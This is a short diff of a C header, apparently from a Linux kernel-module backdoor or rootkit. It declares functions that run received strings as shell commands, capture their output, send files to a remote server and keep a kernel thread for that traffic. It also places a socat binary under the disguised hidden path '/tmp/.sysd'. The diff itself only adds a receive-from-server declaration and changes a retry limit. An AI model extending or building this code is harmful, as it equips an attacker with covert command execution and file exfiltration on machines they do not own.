@@ -46,7 +46,7 @@
 #define STDERR_FILE "/tmp/std.err"
 #define SOCAT_BINARY_PATH "/tmp/.sysd"
 
-#define MAX_MSG_SEND_OR_RECEIVE_ERROR 10
+#define MAX_MSG_SEND_OR_RECEIVE_ERROR 5
 #define TIMEOUT_BEFORE_RETRY 1000
 #define RCV_CMD_BUFFER_SIZE 1024
 #define STD_BUFFER_SIZE 1024
@@ -92,6 +92,7 @@ int exec_str_as_command(char *user_cmd, bool catch_stds);	// Execute a command s
 
 // network.c
 int send_to_server(char *message, ...);						// Send a message to the server
+int receive_from_server(char *recv_buffer, int buffer_size); // Wait for a message from the server
 int send_file_to_server(char *filename);					// Send a file to the server
 int network_worker(void *data);								// Kernel thread for network communication
 int close_socket(void);										// Release the socket
